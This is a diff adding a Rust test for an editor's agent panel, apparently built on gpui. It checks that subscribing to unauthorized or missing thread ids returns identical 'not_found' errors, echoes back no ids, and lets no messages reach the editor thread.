+#[gpui::test]
+async fn hostile_an_editor_thread_another_projects_thread_and_a_missing_id_get_one_identical_not_found(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let web = window(&fs, "/p/web", None, cx).await;
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx).to_key_string();
+    let (_web_announce, web_panel) = connect_panel("/p/web", 10, &web, cx);
+    let web_thread = created_thread(&web_panel, &web, cx);
+    let (_announce, panel) = connect_panel("/p/app", 20, &app, cx);
+    let editor_messages = user_messages(&app);
+
+    let mut answers = Vec::new();
+    for (n, id) in [
+        editor.as_str(),
+        web_thread.as_str(),
+        "00000000-0000-0000-0000-000000000000",
+    ]
+    .into_iter()
+    .enumerate()
+    {
+        let rid = format!("s{n}");
+        panel.handle(
+            request("subscribe", &rid, json!({ "target": { "thread_id": id } })),
+            &app.app_state(),
+            cx,
+        );
+        let answer = reply(&panel.drain(cx), &rid);
+        assert_eq!(answer["kind"], "error", "{answer}");
+        assert_eq!(answer["error"], "not_found", "{answer}");
+        assert_eq!(answer["fatal"], false);
+        answers.push(without_id(answer));
+    }
+    assert_eq!(
+        answers[0], answers[1],
+        "editor vs other project: indistinguishable"
+    );
+    assert_eq!(
+        answers[1], answers[2],
+        "other project vs missing: indistinguishable"
+    );
+    let text = serde_json::to_string(&answers).expect("json");
+    assert!(
+        !text.contains(&editor) && !text.contains(&web_thread),
+        "no id echoed back"
+    );
+
+    // Nothing reaches the editor thread after the refusals.
+    panel.handle(
+        request(
+            "send",
+            "m",
+            json!({ "text": "from the panel", "attachments": [] }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    let sent = reply(&panel.drain(cx), "m");
+    assert_eq!(sent["kind"], "error", "no thread is bound: {sent}");
+    assert_eq!(
+        user_messages(&app),
+        editor_messages,
+        "the editor thread got nothing"
+    );
+}
